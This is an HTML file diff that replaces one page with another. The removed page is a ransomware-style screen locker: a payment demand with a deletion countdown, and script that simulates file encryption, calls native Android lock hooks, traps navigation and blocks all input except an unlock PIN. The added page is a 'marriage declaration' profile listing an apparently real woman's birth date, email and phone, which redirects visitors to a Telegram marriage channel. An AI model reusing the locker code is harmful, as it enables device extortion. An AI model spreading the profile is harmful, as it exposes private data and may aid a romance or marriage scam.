@@ -3,188 +3,166 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Locked</title>
+  <title>Marriage Declaration Profile</title>
   <style>
-    html, body {
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f0f0f5;
       margin: 0;
       padding: 0;
-      background: #550016;
-      font-family: Arial, sans-serif;
-      color: #600010;
+      overflow-x: hidden;
+      height: 72vh;
+    }
+
+    .profile-container {
+      max-width: 650px;
+      margin: auto;
+      background-color: #fff;
+      padding: 30px;
+      border-radius: 15px;
+      margin-top: 99px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+      animation: fadeIn 1s ease-in-out;
+    }
+
+    h1, h2 {
+      text-align: center;
+      color: #2c3e50;
+    }
+
+    .profile-images {
       display: flex;
       justify-content: center;
-      align-items: center;
-      height: 100vh;
-      overflow: hidden;
-      user-select: none;
+      gap: 20px;
+      margin: 20px 0;
     }
-    .container {
-      background: #eee;
-      padding: 5vw;
-      max-width: 90vw;
-      width: 83%;
-      max-height: 95vh;
-      overflow: auto;
-      border-radius: 12px;
-      box-shadow: 0 0 20px black;
-      text-align: center;
-      z-index: 2;
+
+    .profile-img {
+      width: 150px;
+      height: 150px;
+      object-fit: cover;
+      border-radius: 50%;
+      border: 3px solid #2980b9;
+      transition: transform 0.3s ease;
     }
-    .logo {
-      width: 60px;
-      height: 60px;
-      margin-bottom: 20px;
+
+    .profile-img:hover {
+      transform: scale(1.05);
     }
-    .heading {
-      font-size: 1.2rem;
-      font-weight: bold;
-      margin-bottom: 10px;
+
+    .profile-details, .declaration, .integration {
+      display: none;
+      animation: slideUp 0.8s ease-in-out;
     }
-    .subheading {
-      font-size: 1rem;
-      margin-bottom: 10px;
+
+    .visible {
+      display: block;
     }
-    .red {
-      font-size: 1rem;
-      padding: 15px;
-      text-align: left;
-    }
-    .warning {
-      background: #fff0f0;
-      border: 2px dashed red;
-      padding: 15px;
-      margin: 15px 0;
-      font-size: 1rem;
-    }
-    .countdown {
-      font-size: 1.2rem;
-      color: red;
-      font-weight: bold;
-    }
-    input, button {
-      width: 83%;
-      padding: 12px;
-      margin: 10px 0;
-      font-size: 1rem;
-      border: 1px solid #aaa;
-      border-radius: 5px;
-      z-index: 3;
-      position: relative;
-    }
-    #payBtn {
-      background: #ccc;
+
+    button {
+      background-color: #2980b9;
+      color: white;
+      padding: 12px 24px;
+      margin: 10px auto;
+      display: block;
+      border: none;
+      border-radius: 6px;
       cursor: pointer;
+      font-size: 16px;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #1f5e90;
+    }
+
+    #confirmation-message {
+      text-align: center;
+      color: green;
       font-weight: bold;
-      transition: transform 0.15s ease;
+      margin-top: 20px;
     }
-    #payBtn:active {
-      transform: scale(0.95);
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-20px); }
+      to { opacity: 1; transform: translateY(0); }
     }
-    #eco {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100vw;
-      height: 100vh;
-      background: transparent;
-      z-index: 9999;
+
+    @keyframes slideUp {
+      from { opacity: 0; transform: translateY(40px); }
+      to { opacity: 1; transform: translateY(0); }
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSP_ncT1DKjhktnUtJcIMqccUw7jpzx5Fx66g&usqp=CAU" class="logo" alt="Lock Logo">
-    <div class="heading">ACCESS TO YOUR FILES AND PRIVATE DATA HAS BEEN LOCKED.</div>
-    <div class="subheading">Enter your payment details to gain access.</div>
-    <div><strong>$300 USD / €250 EUR</strong></div>
-    <div class="warning">
-      YOUR DATA WILL BE DELETED IN:<br>
-      <div class="countdown" id="timer">23:12:01</div>
-      <div style="color:red; font-weight:bold;">ACT NOW!</div>
+  <div class="profile-container">
+    <h1>Marriage Declaration</h1>
+
+    <div class="profile-images">
+      <img src="IMG_20250508_175145_343.jpg" alt="Gissela Photo" class="profile-img">
+      <img src="IMG_20250508_175144_834.jpg" alt="Chin Photo" class="profile-img">
     </div>
-    <div class="red">Enter PIN To Unlock:</div>
-    <input type="password" id="pinInput" placeholder="PIN" />
-    <button id="payBtn" onclick="makePayment()">PIN UNLOCK</button>
+
+    <!-- Discovery Phase -->
+    <div class="discovery visible">
+      <p style="text-align:center;">
+        Welcome! Let's explore the journey of Oyuki Gissela Gasco Sulca and Chin Hwa Rubi.
+        Click below to continue learning more about their story.
+      </p>
+      <button onclick="nextPhase('profile-details')">Continue to Profile</button>
+    </div>
+
+    <!-- Practice Phase -->
+    <div class="profile-details" id="profile-details">
+      <h2>Profile Details</h2>
+      <p><strong>Full Name:</strong> Oyuki Gissela Gasco Sulca</p>
+      <p><strong>Partner's Name:</strong> Chin Hwa Rubi</p>
+      <p><strong>Date of Birth:</strong> September 4, 1988</p>
+      <p><strong>Email:</strong> gissela_gasco88@libero.it</p>
+      <p><strong>Phone:</strong> +39 328 615 4219</p>
+      <p><strong>Number of Previous Marriages:</strong> 0</p>
+      <p><strong>Number of Children:</strong> 3</p>
+      <p><strong>Relationship Duration:</strong> 2 years</p>
+      <p><strong>Planned Visit to Korea:</strong> August</p>
+      <button onclick="nextPhase('declaration')">Read Declaration</button>
+    </div>
+
+    <!-- Integration Phase -->
+    <div class="declaration" id="declaration">
+      <h2>Declaration</h2>
+      <p>
+        I, Gissela Gasco, originally from Peru and living in Italy, intend to marry Chin Hwa Rubi. Our relationship began as a friendship and grew into love. Despite the distance, we've stayed close. I plan to travel to South Korea this August to meet him, embrace his culture, and formalize our bond. We are ready to take this next step together.
+      </p>
+      <button onclick="nextPhase('integration')">Finalize</button>
+    </div>
+
+    <div class="integration" id="integration">
+      <button onclick="confirmSubmission()">Confirm Submission</button>
+      <p id="confirmation-message"></p>
+    </div>
   </div>
 
- 
   <script>
-  // Simulate encryption of files (in real Android app, call native Java method)
-  function encryptFiles() {
-    const files = ["Documents/file1.txt", "Photos/image1.jpg", "Music/song1.mp3"];
-    const encrypted = files.map(file => ({ file, status: "ENCRYPTED" }));
-    localStorage.setItem("lockedFiles", JSON.stringify(encrypted));
-    console.log("Files encrypted.");
-    if (typeof Android !== "undefined") Android.encryptDevice?.(); // call native if exists
-  }
-
-  // Prevent back button (Android)
-  history.pushState(null, null, location.href);
-  window.onpopstate = () => {
-    history.go(1);
-  };
-
-  // Hide system UI (for Android WebView fullscreen lockdown)
-  function hideSystemUI() {
-    if (typeof Android !== "undefined") {
-      Android.hideSystemUI?.(); // should trigger immersive mode via Java
+    function nextPhase(nextId) {
+      // Hide all phase sections
+      document.querySelectorAll('.profile-details, .declaration, .integration, .discovery').forEach(section => {
+        section.classList.remove('visible');
+      });
+      // Show the selected section
+      const nextSection = document.getElementById(nextId) || document.querySelector(`.${nextId}`);
+      if (nextSection) {
+        nextSection.classList.add('visible');
+      }
     }
-    const el = document.documentElement;
-    if (el.requestFullscreen) {
-      el.requestFullscreen().catch(() => {});
-    }
-  }
 
-  // PIN unlock function
-  function makePayment() {
-    const pin = document.getElementById('pinInput')?.value.trim();
-    if (typeof Android !== "undefined") Android.playClickSound?.();
+    function confirmSubmission() {
+  // Optional: show confirmation message
+  document.getElementById("confirmation-message").textContent =
+    "Thank you, Ms. Gasco. Redirecting you to our Telegram channel...";
 
-    if (pin === "VMK324") {
-      if (typeof Android !== "undefined") Android.unlockDevice?.();
-      localStorage.removeItem("lockedFiles"); // Simulate unlock
-      window.location.href = "success.html";
-    } else {
-      alert("Incorrect PIN. Try again.");
-    }
-  }
-
-  // Countdown timer
-  let seconds = 1, minutes = 12, hours = 23;
-  setInterval(() => {
-    seconds--;
-    if (seconds < 0) { seconds = 59; minutes--; }
-    if (minutes < 0) { minutes = 59; hours--; }
-    if (hours < 0) { hours = 0; minutes = 0; seconds = 0; }
-    const timer = document.getElementById('timer');
-    if (timer) {
-      timer.textContent = `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
-    }
-  }, 1000);
-
-  // On page load
-  document.addEventListener('DOMContentLoaded', () => {
-    hideSystemUI();
-    encryptFiles(); // simulate encryption
-    document.getElementById('pinInput')?.focus();
-  });
-
-  // Freeze all interactions except PIN input and Unlock button
-  document.addEventListener('click', function(e) {
-    const allowed = ['pinInput', 'payBtn'];
-    if (!allowed.includes(e.target.id)) {
-      e.stopPropagation();
-      e.preventDefault();
-    }
-  }, true);
-
-  document.addEventListener('touchstart', function(e) {
-    const allowed = ['pinInput', 'payBtn'];
-    if (!allowed.includes(e.target.id)) {
-      e.stopPropagation();
-      e.preventDefault();
-    }
-  }, { passive: false, capture: true });
-</script>
+  // Redirect to Telegram user or group
+  window.location.href = "https://t.me/Korean_marriage564";
+}
+  </script>
 </body>
 </html>
-    
